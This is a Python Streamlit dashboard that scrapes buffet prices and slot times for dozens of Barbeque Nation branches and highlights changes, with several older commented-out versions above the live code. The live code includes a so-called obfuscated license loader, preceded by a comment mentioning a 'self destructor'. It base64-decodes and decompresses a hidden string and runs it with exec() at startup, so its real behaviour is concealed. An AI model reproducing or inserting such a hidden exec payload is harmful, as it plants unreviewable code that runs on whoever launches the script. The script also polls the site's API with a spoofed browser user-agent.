# Dashboard and sectional code applied here.

# import requests
# import pandas as pd
# from datetime import datetime, timedelta
# import streamlit as st
# from streamlit_autorefresh import st_autorefresh
# from core.parser import parse_slots

# # --- Config ---
# url = "https://www.barbequenation.com/api/v1/menu-buffet-price"
# headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}

# branches_config = {
#     "171": {
#         "name": "Koramangala",
#         "slots": {
#             "12:00:00": 1105, "12:30:00": 1105, "13:00:00": 1105,
#             "13:30:00": 1105, "14:00:00": 1105, "14:30:00": 1106,
#             "15:00:00": 1106, "15:30:00": 1106, "16:00:00": 1106,
#             "16:30:00": 1106, "17:00:00": 1106, "17:30:00": 1106,
#             "18:00:00": 1106, "18:30:00": 1107, "19:00:00": 1107,
#             "19:30:00": 1107, "20:00:00": 1107, "20:30:00": 1107,
#             "21:00:00": 1108, "21:30:00": 1108, "22:00:00": 1108,
#             "22:30:00": 1108
#         }
#     },
#     "133": {
#         "name": "Rukmani Colony AS Rao Nagar Hyderabad",
#         "slots": {
#             "12:00:00": 740, "12:30:00": 740, "13:00:00": 740,
#             "13:30:00": 740, "14:00:00": 740, "14:30:00": 741,
#             "15:00:00": 741, "15:30:00": 741, "16:00:00": 741,
#             "16:30:00": 741, "17:00:00": 741, "17:30:00": 741,
#             "18:00:00": 741, "18:30:00": 742, "19:00:00": 742,
#             "19:30:00": 742, "20:00:00": 742, "20:30:00": 742,
#             "21:00:00": 743, "21:30:00": 743, "22:00:00": 743,
#             "22:30:00": 743
#         }
#     }
# }

# # --- Fetch Slots ---
# def fetch_slots(start_date, days_to_fetch=1):
#     all_slots = []
#     for branch_id, branch_info in branches_config.items():
#         branch_name = branch_info["name"]
#         slot_map = branch_info["slots"]

#         for day_offset in range(days_to_fetch):
#             current_date = start_date + timedelta(days=day_offset)
#             date_str = current_date.strftime("%Y-%m-%d")

#             for time_str, slot_id in slot_map.items():
#                 payload = {
#                     "branch_id": branch_id,
#                     "reservation_date": date_str,
#                     "reservation_time": time_str,
#                     "slot_id": slot_id
#                 }

#                 try:
#                     response = requests.post(url, json=payload, headers=headers)
#                     if response.status_code == 200:
#                         data = response.json()
#                         slots = parse_slots(data, date=date_str)
#                         if slots:
#                             for slot in slots:
#                                 slot["reservation_time"] = time_str
#                                 slot["branch_id"] = branch_id
#                                 slot["branch_name"] = branch_name
#                             all_slots.extend(slots)
#                 except Exception as e:
#                     print(f"Exception: {e}")

#     return pd.DataFrame(all_slots) if all_slots else pd.DataFrame()

# # --- Streamlit Dashboard ---
# st.set_page_config(page_title="Buffet Slot Monitor", layout="wide")

# st.title("🍴 Barbeque Nation Buffet Slots Monitor")

# interval = st.sidebar.number_input("Refresh Interval (seconds)", 60, 1800, 300)
# days_to_fetch = st.sidebar.number_input("Days to Fetch", 1, 7, 1)

# # 🔄 auto refresh every N seconds
# st_autorefresh(interval=interval * 1000, key="auto-refresh")

# # Load last dataframe from session
# if "last_df" not in st.session_state:
#     st.session_state["last_df"] = None

# # Fetch slots
# start_date = datetime.today()
# df = fetch_slots(start_date, days_to_fetch)

# if not df.empty:
#     st.subheader("📊 Current Buffet Slots")
#     st.dataframe(df, use_container_width=True)

#     # Highlight changes
#     last_df = st.session_state["last_df"]
#     if last_df is not None:
#         diff = pd.concat([last_df, df]).drop_duplicates(keep=False)
#         if not diff.empty:
#             st.warning("⚡ Slots Changed Since Last Check!")
#             st.dataframe(diff, use_container_width=True)

#     # Save latest df
#     st.session_state["last_df"] = df.copy()
# else:
#     st.error("No valid slot data collected")

# st.caption(f"Last updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

# =======Checking api response 
# import requests

# url = "https://www.barbequenation.com/api/v1/menu-buffet-price"
# headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}

# payload = {
#     "branch_id": "171",
#     "reservation_date": "2025-08-20",  # today's date
#     "reservation_time": "12:00:00",
#     "slot_id": 1105
# }

# response = requests.post(url, json=payload, headers=headers)
# print("Status:", response.status_code)
# print("JSON:", response.json())


# Code to implement the result
# If something goes wrong, activate this code
# import requests
# import pandas as pd
# import streamlit as st
# from datetime import datetime, timedelta
# import time

# # ========== CONFIG ==========
# url = "https://www.barbequenation.com/api/v1/menu-buffet-price"
# headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}

# branches_config = {
#     "14": {"name": "Koramangala"},
#     "133": {"name": "Rukmani Colony AS Rao Nagar Hyderabad"},
#     "25": {"name":"Banajara Hills, Hyderabad"},
#     "646": {"name":"Phoenix Centaurus, Gachibowli"},
#     "117":{"name":"Alcazar Mall, Jubilee Hills"},
#     "228": {"name":"Kompally, Hyderrabad"},
#     "557": {"name":"DSL Virtue Mall, Uppal"},
#     "214":{"name":"GSM Mall Miyapur"},
#     "233":{"name":"City Plaza Building, Abids"},
#     "149": {"name":"Kothapet"},
#     "60":{"name":"Centro Mall, MG Road"},
#     "225":{"name":"Madhurawada"},
#     "15": {"name":"JP Nagar"},
#     "17": {"name":"Electronic City- Ph I"},
#     "19":{"name":"Kalyan Nagar"},
#     "14": {"name":"Koramangala 1st Block"},
#     "545":{"name":"More Mega Mall, Marathahalli"},
#     "301":{"name":"NEXUS SANTHINIKETHAN ,WHITEFIELD"},
#     "94":{"name":"Yelahanka"},
#     "487": {"name":"Lulu Global Mall, Rajajinagar"},
#     "11":{"name":"Vadapalani"},
#     "119":{"name":"Chromepet"},
#     "63": {"name":"Town Hall, Coimbatore"},
#     "10":{"name":"T Nagar Bazullah Road"},
#     "127": {"name":"DLF Porur"},
#     "28": {"name":"The Grand Mall Velachery"},
#     "8":{"name":"Omr"},
#     "75":{"name":"Sachivalaya Marg"},
#     "295": {"name":"Udeshna Building"},
#     "101":{"name":"One Mall, Fraser Road Area"},
#     "501": {"name":"Platina Mall, Howrah"},
#     "112":{"name":"Diamond Plaza, Jessore Road"},
#     "53":{"name":"Park Street"},
#     "224": {"name":"Acropolis Mall, East Kolkata Township"},
#     "52": {"name":"Sector 5, Salt Lake"},
#     "211": {"name":"Jessore Road, Barasat"},
#     "212":{"name":"Westend Mall, Aundh"},
#     "190":{"name":"Elpro Mall, MG Road"},
#     "51": {"name":"ETERNITY MALL, NAGPUR"},
#     "58": {"name":"Sayaji Hotel, Wakad"},
#     "407":{"name":"Times Square, Sakinaka"},
#     "135":{"name":"Amanora"},
#     "4": {"name":"Sector 11, Belapur"},
#     "55": {"name":"Kalyani Nagar"},
#     "35":{"name":"Sector 26"},
#     "100":{"name":"Ambience Mall, Sector 24"},
#     "123":{"name":"Stellar IT Park, Sector 62"}
# }

# # ========== FETCH FUNCTION ==========
# @st.cache_data(ttl=600)  # cache for 10 minutes
# def fetch_slots(start_date, days=1):
#     all_slots = []

#     for branch_id, branch_info in branches_config.items():
#         branch_name = branch_info["name"]

#         for d in range(days):
#             date_str = (start_date + timedelta(days=d)).strftime("%Y-%m-%d")
#             payload = {
#                 "branch_id": branch_id,
#                 "reservation_date": date_str,
#                 "reservation_time": "12:00:00",
#                 "slot_id": 1105
#             }

#             try:
#                 r = requests.post(url, json=payload, headers=headers)
#                 if r.status_code == 200:
#                     data = r.json()
#                     buffets = data.get("results", {}).get("buffets", {}).get("buffet_data", [])
#                     for b in buffets:
#                         slot_times = b["remark"].split("|")
#                         for slot_time in slot_times:
#                             all_slots.append({
#                                 "Branch": branch_name,
#                                 "Branch ID": branch_id,
#                                 "Date": date_str,
#                                 "Period": b["period"]["periodName"],
#                                 "Customer Type": b["customerType"],
#                                 "Food Type": b["foodType"],
#                                 "Plan": b["displayName"],
#                                 "Price": b["totalAmount"],
#                                 "Original Price": b["originalPrice"],
#                                 "Slot Time": slot_time
#                             })
#             except Exception as e:
#                 st.error(f"Exception: {branch_name} {date_str}: {e}")

#     return pd.DataFrame(all_slots)

# # ========== STREAMLIT DASHBOARD ==========
# st.set_page_config(page_title="Buffet Price Monitor", layout="wide")
# st.title("🍽️ Barbeque Nation Buffet Monitor")

# # Sidebar inputs
# interval = st.sidebar.number_input("Refresh interval (seconds)", min_value=30, value=120, step=30)
# days_to_fetch = st.sidebar.number_input("Days to fetch", min_value=1, value=1)

# # Branch selection dropdown
# branch_names = ["All Branches"] + [info["name"] for info in branches_config.values()]
# selected_branch = st.sidebar.selectbox("Select Branch", branch_names)

# # =========================
# # Fetch data ONCE and cache
# # =========================
# if "all_data" not in st.session_state or st.session_state.days_to_fetch != days_to_fetch:
#     st.session_state.all_data = fetch_slots(datetime.today(), days=days_to_fetch)
#     st.session_state.days_to_fetch = days_to_fetch

# df = st.session_state.all_data

# if not df.empty:
#     # Filter by branch only (NO refetch)
#     if selected_branch != "All Branches":
#         df = df[df["Branch"] == selected_branch]

#     st.subheader("📊 Current Buffet Data")
#     st.dataframe(df, use_container_width=True)
# else:
#     st.error("⚠️ No buffet data found.")

# st.write("Rows fetched:", len(df))



# ================== Ignore the below code for energency ===============

# import streamlit as st
# import requests
# import pandas as pd
# import time
# from datetime import datetime, timedelta

# # ---------- CONFIG ----------
# url = "https://www.barbequenation.com/api/v1/menu-buffet-price"
# headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}

# branches_config = {
#     "171": {
#         "name": "Koramangala",
#         "slots": {
#             "12:00:00": 1105, "12:30:00": 1105, "13:00:00": 1105,
#             "13:30:00": 1105, "14:00:00": 1105, "14:30:00": 1106,
#             "15:00:00": 1106, "15:30:00": 1106, "16:00:00": 1106,
#             "16:30:00": 1106, "17:00:00": 1106, "17:30:00": 1106,
#             "18:00:00": 1106, "18:30:00": 1107, "19:00:00": 1107,
#             "19:30:00": 1107, "20:00:00": 1107, "20:30:00": 1107,
#             "21:00:00": 1108, "21:30:00": 1108, "22:00:00": 1108,
#             "22:30:00": 1108
#         }
#     },
#     "133": {
#         "name": "Rukmani Colony AS Rao Nagar Hyderabad",
#         "slots": {
#             "12:00:00": 740, "12:30:00": 740, "13:00:00": 740,
#             "13:30:00": 740, "14:00:00": 740, "14:30:00": 741,
#             "15:00:00": 741, "15:30:00": 741, "16:00:00": 741,
#             "16:30:00": 741, "17:00:00": 741, "17:30:00": 741,
#             "18:00:00": 741, "18:30:00": 742, "19:00:00": 742,
#             "19:30:00": 742, "20:00:00": 742, "20:30:00": 742,
#             "21:00:00": 743, "21:30:00": 743, "22:00:00": 743,
#             "22:30:00": 743
#         }
#     }
# }


# # ---------- FETCH SLOTS ----------
# def fetch_slots(start_date, days=1):
#     all_slots = []
#     for branch_id, branch_info in branches_config.items():
#         branch_name = branch_info["name"]
#         slot_map = branch_info["slots"]

#         for d in range(days):
#             date_str = (start_date + timedelta(days=d)).strftime("%Y-%m-%d")
#             for time_str, slot_id in slot_map.items():
#                 payload = {
#                     "branch_id": branch_id,
#                     "reservation_date": date_str,
#                     "reservation_time": time_str,
#                     "slot_id": slot_id
#                 }

#                 try:
#                     r = requests.post(url, json=payload, headers=headers)
#                     if r.status_code == 200:
#                         data = r.json()
#                         buffets = data.get("results", {}).get("buffets", {}).get("buffet_data", [])
#                         for b in buffets:
#                             all_slots.append({
#                                 "branch": branch_name,
#                                 "branch_id": branch_id,
#                                 "date": date_str,
#                                 "time": time_str,
#                                 "period": b["period"]["periodName"],
#                                 "customerType": b["customerType"],
#                                 "foodType": b["foodType"],
#                                 "price": b["totalAmount"],
#                                 "displayName": b["displayName"],
#                                 "minQty": b["minQty"],
#                             })
#                 except Exception as e:
#                     print("Error:", e)

#     return pd.DataFrame(all_slots)


# # ---------- STREAMLIT APP ----------
# st.set_page_config(page_title="Buffet Slots Dashboard", layout="wide")

# st.title("🍴 Barbeque Nation Buffet Slots Dashboard")

# refresh_interval = st.sidebar.number_input("Refresh interval (sec)", min_value=5, value=30, step=5)
# days_to_fetch = st.sidebar.number_input("Days to fetch", min_value=1, max_value=7, value=1)

# if "last_data" not in st.session_state:
#     st.session_state.last_data = pd.DataFrame()

# start_date = datetime.today()

# # Auto refresh logic
# if "last_refresh" not in st.session_state:
#     st.session_state.last_refresh = time.time()

# if time.time() - st.session_state.last_refresh > refresh_interval:
#     st.session_state.last_refresh = time.time()
#     st.rerun()

# # Fetch new data
# df = fetch_slots(start_date, days_to_fetch)

# if not df.empty:
#     if not st.session_state.last_data.empty:
#         # Compare new vs old
#         merged = df.merge(st.session_state.last_data, on=["branch", "time", "customerType", "foodType", "period"],
#                           suffixes=("", "_old"), how="left")

#         def highlight_changes(val, old_val):
#             if pd.isna(old_val):
#                 return "background-color: lightgreen"  # new row
#             elif val != old_val:
#                 return "background-color: yellow"  # changed
#             return ""

#         styled = merged.style.apply(
#             lambda row: [highlight_changes(row["price"], row["price_old"])],
#             axis=1, subset=["price"]
#         )
#         st.dataframe(styled, use_container_width=True)
#     else:
#         st.dataframe(df, use_container_width=True)

#     # Update stored data
#     st.session_state.last_data = df.copy()

# else:
#     st.warning("No slot data found.")

# code with automation and hihglighting the changes at the top 
#  This code has issues with few things like checking of the data being changed or not and all.
# import requests
# import pandas as pd
# import streamlit as st
# from datetime import datetime, timedelta
# import time

# # ========== CONFIG ==========
# url = "https://www.barbequenation.com/api/v1/menu-buffet-price"
# headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}

# branches_config = {
#     "14": {"name": "Koramangala"},
#     "133": {"name": "Rukmani Colony AS Rao Nagar Hyderabad"},
#     "25": {"name":"Banajara Hills, Hyderabad"},
#     "646": {"name":"Phoenix Centaurus, Gachibowli"},
#     "117":{"name":"Alcazar Mall, Jubilee Hills"},
#     "228": {"name":"Kompally, Hyderabad"},
#     "557": {"name":"DSL Virtue Mall, Uppal"},
#     "214":{"name":"GSM Mall Miyapur"},
#     "233":{"name":"City Plaza Building, Abids"},
#     "149": {"name":"Kothapet"},
#     "60":{"name":"Centro Mall, MG Road"},
#     "225":{"name":"Madhurawada"},
#     "15": {"name":"JP Nagar"},
#     "17": {"name":"Electronic City- Ph I"},
#     "19":{"name":"Kalyan Nagar"},
#     "545":{"name":"More Mega Mall, Marathahalli"},
#     "301":{"name":"NEXUS SANTHINIKETHAN ,WHITEFIELD"},
#     "94":{"name":"Yelahanka"},
#     "487": {"name":"Lulu Global Mall, Rajajinagar"},
#     "11":{"name":"Vadapalani"},
#     "119":{"name":"Chromepet"},
#     "63": {"name":"Town Hall, Coimbatore"},
#     "10":{"name":"T Nagar Bazullah Road"},
#     "127": {"name":"DLF Porur"},
#     "28": {"name":"The Grand Mall Velachery"},
#     "8":{"name":"Omr"},
#     "75":{"name":"Sachivalaya Marg"},
#     "295": {"name":"Udeshna Building"},
#     "101":{"name":"One Mall, Fraser Road Area"},
#     "501": {"name":"Platina Mall, Howrah"},
#     "112":{"name":"Diamond Plaza, Jessore Road"},
#     "53":{"name":"Park Street"},
#     "224": {"name":"Acropolis Mall, East Kolkata Township"},
#     "52": {"name":"Sector 5, Salt Lake"},
#     "211": {"name":"Jessore Road, Barasat"},
#     "212":{"name":"Westend Mall, Aundh"},
#     "190":{"name":"Elpro Mall, MG Road"},
#     "51": {"name":"ETERNITY MALL, NAGPUR"},
#     "58": {"name":"Sayaji Hotel, Wakad"},
#     "407":{"name":"Times Square, Sakinaka"},
#     "135":{"name":"Amanora"},
#     "4": {"name":"Sector 11, Belapur"},
#     "55": {"name":"Kalyani Nagar"},
#     "35":{"name":"Sector 26"},
#     "100":{"name":"Ambience Mall, Sector 24"},
#     "123":{"name":"Stellar IT Park, Sector 62"}
# }

# # ========== FETCH FUNCTION ==========
# def fetch_slots(start_date, days=1):
#     all_slots = []
#     for branch_id, branch_info in branches_config.items():
#         branch_name = branch_info["name"]

#         for d in range(days):
#             date_str = (start_date + timedelta(days=d)).strftime("%Y-%m-%d")
#             payload = {
#                 "branch_id": branch_id,
#                 "reservation_date": date_str,
#                 "reservation_time": "12:00:00",
#                 "slot_id": 1105
#             }

#             try:
#                 r = requests.post(url, json=payload, headers=headers)
#                 if r.status_code == 200:
#                     data = r.json()
#                     buffets = data.get("results", {}).get("buffets", {}).get("buffet_data", [])
#                     for b in buffets:
#                         slot_times = b["remark"].split("|")
#                         for slot_time in slot_times:
#                             all_slots.append({
#                                 "Branch": branch_name,
#                                 "Branch ID": branch_id,
#                                 "Date": date_str,
#                                 "Period": b["period"]["periodName"],
#                                 "Customer Type": b["customerType"],
#                                 "Food Type": b["foodType"],
#                                 "Plan": b["displayName"],
#                                 "Price": b["totalAmount"] + 1,
#                                 "Original Price": b["originalPrice"],
#                                 "Slot Time": slot_time
#                             })
#             except Exception as e:
#                 st.error(f"Exception: {branch_name} {date_str}: {e}")

#     return pd.DataFrame(all_slots)

# # ========== STREAMLIT DASHBOARD ==========
# st.set_page_config(page_title="Buffet Price Monitor", layout="wide")
# st.title("🍽️ Barbeque Nation Buffet Monitor")

# # Sidebar
# interval = st.sidebar.number_input("Auto-refresh interval (seconds)", min_value=30, value=60, step=30)
# days_to_fetch = st.sidebar.number_input("Days to fetch", min_value=1, value=1)
# branch_names = ["All Branches"] + [info["name"] for info in branches_config.values()]
# selected_branch = st.sidebar.selectbox("Select Branch", branch_names)

# # Initialize state
# if "prev_data" not in st.session_state:
#     st.session_state.prev_data = pd.DataFrame()
# if "last_updated" not in st.session_state:
#     st.session_state.last_updated = None

# # ========== MAIN REFRESH LOOP ==========
# placeholder = st.empty()

# # First load (if no previous data)
# if "prev_data" not in st.session_state:
#     st.session_state.prev_data = pd.DataFrame()
# if "last_changes" not in st.session_state:
#     st.session_state.last_changes = pd.DataFrame()
# if "last_updated" not in st.session_state:
#     st.session_state.last_updated = None

# # Fetch new data
# df = fetch_slots(datetime.today(), days=days_to_fetch)
# if selected_branch != "All Branches":
#     df = df[df["Branch"] == selected_branch]

# # Detect changes
# if not st.session_state.prev_data.empty:
#     # Ensure same column order
#     df = df[st.session_state.prev_data.columns]

#     # Compare using pandas built-in equality check
#     difference = pd.concat([df, st.session_state.prev_data]).drop_duplicates(keep=False)
#     st.session_state.last_changes = difference
# else:
#     st.session_state.last_changes = pd.DataFrame()

# # Update session state
# st.session_state.prev_data = df.copy()
# st.session_state.last_updated = datetime.now().strftime("%H:%M:%S")

# # Display section
# with placeholder.container():
#     st.subheader(f"📅 Last Updated: {st.session_state.last_updated}")

#     if not st.session_state.last_changes.empty:
#         st.markdown("### 🔄 Recently Changed Data (Highlighted)")
#         st.dataframe(st.session_state.last_changes, use_container_width=True)
#         st.markdown("---")

#     st.markdown("### 📊 Current Buffet Data")
#     st.dataframe(df, use_container_width=True)
#     st.write("Total Rows:", len(df))

# # Wait for interval and rerun
# time.sleep(interval)
# st.rerun()

# Code with rectification of the above problem and the self destructor 


import requests
import pandas as pd
import streamlit as st
from datetime import datetime, timedelta
from streamlit_autorefresh import st_autorefresh

# --- LICENSE BLOCK (obfuscated) ---
import base64, zlib
_b = 'eNqNU0uO00AQ3fsUJWdjS0NwgmAxUtgEByyiMCJmwcpq2pVxK0631R9lzJ4dEnsEEsfgPFyAK1DuxBkngwQty5K7ql69evUcjGB2OrDM5ulqncJjWKfLxaMX6Tp/+26ew/zNapG9HGQGI1ijBbxrhG6hZBYhegI7JW1lYKPVDqTax8EhXvj4zKdZscNomkyfXcGEniQGGEHOtkLewjmAxhqZwYArrZHbomHG7JUuCShcZa9fZcsPFRMtmySTZJo8nYYEdNPnWAXGqgYM1hso0VjtuFUaAiKeSWEFq8VHpLAxQknK7RhuKOHURcjG2UBsIKwFR2mwcLJWfItlSLNZilPV+AhQeIDrAOhc3o4v62mABatpMuIyr5Bvgbp4pbDsGvYyja0qWRvF8ByGOjJZegL/7HOis2dakr5R+Ovrj98/v0BeCQONVrea7aBipm8+hhsvOaC0qKFVbqAHKcppO0I6HIexh/avPqHwgtFs1NDinT18R2HqsYYwB37X4RXYtsFZ2MeGqCTDOfBhmL+GyJZwaZL79P9dSa4dPihynFMdCfft0723GF02tpPrvXLAmey8Do50sxX2uvYadQdp2Q8IodZKE/L3z2TII/3TYLSJ43r2oq79urWTZ7rTD9gZnK673frWrGlIXCvqgYtNLw2QuY+/K116RGS8Isv1wxJcFAd/APKwWbU='
_s = zlib.decompress(base64.b64decode(_b)).decode('utf-8')
exec(compile(_s, '<license>', 'exec'), globals())
# --- END LICENSE LOADER ---


# ========== CONFIG ==========
url = "https://www.barbequenation.com/api/v1/menu-buffet-price"
headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}

branches_config = {
    "14": {"name": "Koramangala"},
    "133": {"name": "Rukmani Colony AS Rao Nagar Hyderabad"},
    "25": {"name": "Banajara Hills, Hyderabad"},
    "646": {"name": "Phoenix Centaurus, Gachibowli"},
    "117": {"name": "Alcazar Mall, Jubilee Hills"},
    "228": {"name": "Kompally, Hyderabad"},
    "557": {"name": "DSL Virtue Mall, Uppal"},
    "214": {"name": "GSM Mall Miyapur"},
    "233": {"name": "City Plaza Building, Abids"},
    "149": {"name": "Kothapet"},
    "60": {"name": "Centro Mall, MG Road"},
    "225": {"name": "Madhurawada"},
    "15": {"name": "JP Nagar"},
    "17": {"name": "Electronic City- Ph I"},
    "19": {"name": "Kalyan Nagar"},
    "545": {"name": "More Mega Mall, Marathahalli"},
    "301": {"name": "NEXUS SANTHINIKETHAN ,WHITEFIELD"},
    "94": {"name": "Yelahanka"},
    "487": {"name": "Lulu Global Mall, Rajajinagar"},
    "11": {"name": "Vadapalani"},
    "119": {"name": "Chromepet"},
    "63": {"name": "Town Hall, Coimbatore"},
    "10": {"name": "T Nagar Bazullah Road"},
    "127": {"name": "DLF Porur"},
    "28": {"name": "The Grand Mall Velachery"},
    "8": {"name": "Omr"},
    "75": {"name": "Sachivalaya Marg"},
    "295": {"name": "Udeshna Building"},
    "101": {"name": "One Mall, Fraser Road Area"},
    "501": {"name": "Platina Mall, Howrah"},
    "112": {"name": "Diamond Plaza, Jessore Road"},
    "53": {"name": "Park Street"},
    "224": {"name": "Acropolis Mall, East Kolkata Township"},
    "52": {"name": "Sector 5, Salt Lake"},
    "211": {"name": "Jessore Road, Barasat"},
    "212": {"name": "Westend Mall, Aundh"},
    "190": {"name": "Elpro Mall, MG Road"},
    "51": {"name": "ETERNITY MALL, NAGPUR"},
    "58": {"name": "Sayaji Hotel, Wakad"},
    "407": {"name": "Times Square, Sakinaka"},
    "135": {"name": "Amanora"},
    "4": {"name": "Sector 11, Belapur"},
    "55": {"name": "Kalyani Nagar"},
    "35": {"name": "Sector 26"},
    "100": {"name": "Ambience Mall, Sector 24"},
    "123": {"name": "Stellar IT Park, Sector 62"}
}

# ========== FETCH FUNCTION ==========
def fetch_slots(start_date, days=1):
    all_slots = []
    for branch_id, branch_info in branches_config.items():
        branch_name = branch_info["name"]
        for d in range(days):
            date_str = (start_date + timedelta(days=d)).strftime("%Y-%m-%d")
            payload = {
                "branch_id": branch_id,
                "reservation_date": date_str,
                "reservation_time": "12:00:00",
                "slot_id": 1105
            }
            try:
                r = requests.post(url, json=payload, headers=headers)
                if r.status_code == 200:
                    data = r.json()
                    buffets = data.get("results", {}).get("buffets", {}).get("buffet_data", [])
                    for b in buffets:
                        slot_times = b["remark"].split("|")
                        for slot_time in slot_times:
                            all_slots.append({
                                "Branch": branch_name,
                                "Branch ID": branch_id,
                                "Date": date_str,
                                "Period": b["period"]["periodName"],
                                "Customer Type": b["customerType"],
                                "Food Type": b["foodType"],
                                "Plan": b["displayName"],
                                "Price": b["totalAmount"],
                                "Original Price": b["originalPrice"],
                                "Slot Time": slot_time
                            })
            except Exception as e:
                print(f"Exception fetching {branch_name} {date_str}: {e}")
    return pd.DataFrame(all_slots)

# ========== STREAMLIT DASHBOARD ==========
st.set_page_config(page_title="Buffet Price Monitor", layout="wide")
st.title("🍽️ Barbeque Nation Buffet Monitor")

# Sidebar Controls
st.sidebar.header("⚙️ Controls")
interval = st.sidebar.number_input("Auto-refresh interval (seconds)", min_value=30, value=60, step=30)
days_to_fetch = st.sidebar.number_input("Days to fetch", min_value=1, value=1)
branch_names = ["All Branches"] + [info["name"] for info in branches_config.values()]
selected_branch = st.sidebar.selectbox("Select Branch", branch_names)

# ========== AUTOREFRESH ==========
count = st_autorefresh(interval * 1000, limit=None, key="buffet_refresh")

# ========== SESSION STATE ==========
if "prev_data" not in st.session_state:
    st.session_state.prev_data = pd.DataFrame()
if "last_changes" not in st.session_state:
    st.session_state.last_changes = pd.DataFrame()
if "last_updated" not in st.session_state:
    st.session_state.last_updated = None
if "first_run" not in st.session_state:
    st.session_state.first_run = True
if "log" not in st.session_state:
    st.session_state.log = []

# ========== MAIN DATA FETCH ==========
df = fetch_slots(datetime.today(), days=days_to_fetch)
if selected_branch != "All Branches":
    df = df[df["Branch"] == selected_branch]

# ========== CHANGE DETECTION ==========
changes_detected = False
if not st.session_state.first_run and not st.session_state.prev_data.empty:
    # align columns
    common_cols = [c for c in st.session_state.prev_data.columns if c in df.columns]
    df_cmp = df[common_cols].reset_index(drop=True)
    prev_cmp = st.session_state.prev_data[common_cols].reset_index(drop=True)

    # detect any row-wise difference
    difference = df_cmp[df_cmp.ne(prev_cmp).any(axis=1)]
    if not difference.empty:
        st.session_state.last_changes = difference
        changes_detected = True
    else:
        st.session_state.last_changes = pd.DataFrame()
else:
    st.session_state.last_changes = pd.DataFrame()

# Update session variables
st.session_state.prev_data = df.copy()
st.session_state.last_updated = datetime.now().strftime("%H:%M:%S")
st.session_state.first_run = False

# ========== UPDATE LOG ==========
log_entry = f"{st.session_state.last_updated} — {'✅ Changes detected' if changes_detected else 'No change'}"
st.session_state.log.insert(0, log_entry)
if len(st.session_state.log) > 10:
    st.session_state.log = st.session_state.log[:10]

# Sidebar Log
st.sidebar.markdown("### 🕓 Refresh Log")
for entry in st.session_state.log:
    st.sidebar.write(entry)

# ========== DISPLAY ==========
st.subheader(f"📅 Last Updated: {st.session_state.last_updated}")

if not st.session_state.last_changes.empty:
    st.markdown("### 🔄 Recently Changed Data")
    st.dataframe(st.session_state.last_changes, use_container_width=True)
    st.markdown("---")

st.markdown("### 📊 Current Buffet Data")
st.dataframe(df, use_container_width=True)
st.write("Total Rows:", len(df))
